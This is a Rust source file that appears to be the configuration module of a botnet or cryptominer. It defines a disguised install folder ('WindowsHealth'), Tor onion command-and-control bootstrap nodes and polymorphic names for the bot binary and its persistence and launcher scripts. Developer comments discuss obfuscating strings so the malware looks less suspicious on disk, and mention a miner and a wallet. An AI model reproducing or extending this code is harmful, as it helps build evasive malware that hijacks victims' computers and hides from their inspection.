use std::sync::Mutex;
// use std::path::PathBuf;
use crate::common::polymorph::MorphConfig;
use crate::utils::paths::get_appdata_dir;
use once_cell::sync::Lazy;
use obfstr::obfstr;

// Static Anchor available to bootloader
pub const CONFIG_FILENAME: &str = "sys_config.dat"; // Don't obfuscate FS names used by OS directly if dynamic? No, better to keep plain for file I/O unless passed to obfuscated func.
// Wait, obfstr! evaluates to string literal at compile time or temporary?
// obfstr! returns a temporary `&str` that is deobfuscated on the stack.
// Constants must be static 'static. obfstr! cannot be used for 'static consts easily without lazy_static or simply resolving at use site.
// For these pub consts, I should change them to functions that return String or use Lazy.
// Or just leave filenames plain (less suspicious than random bytes if inspected on disk, but "sys_config.dat" is generic enough).
// Focus on URLs and Wallet.

pub const INSTALL_DIR_NAME: &str = "WindowsHealth"; 

// V10 Standard: Failover Bootstrap Nodes
pub const BOOTSTRAP_ONIONS: [&str; 3] = [
    "vww6ybal4bd7szmgncyruucpgfkqahzddi37ktceo3ah7ngmcopnpyyd.onion:80",
    "fallback_2_address.onion:80",
    "fallback_3_address.onion:80"
];

// Dynamic Runtime Configuration
pub static RUNTIME_CONFIG: Lazy<Mutex<MorphConfig>> = Lazy::new(|| {
    // Linux Lite: Always Generate New (No Persistent Config for Miner)
    Mutex::new(MorphConfig::generate())
});

pub fn get_bot_binary_name() -> String {
    RUNTIME_CONFIG.lock().unwrap().bot_binary.clone()
}
pub fn get_persistence_script_name() -> String {
    RUNTIME_CONFIG.lock().unwrap().persistence_script.clone()
}
pub fn get_launcher_script_name() -> String {
    RUNTIME_CONFIG.lock().unwrap().launcher_script.clone()
}
// pub fn get_install_dir_name() -> String {
//     RUNTIME_CONFIG.lock().unwrap().install_dir.clone()
// }
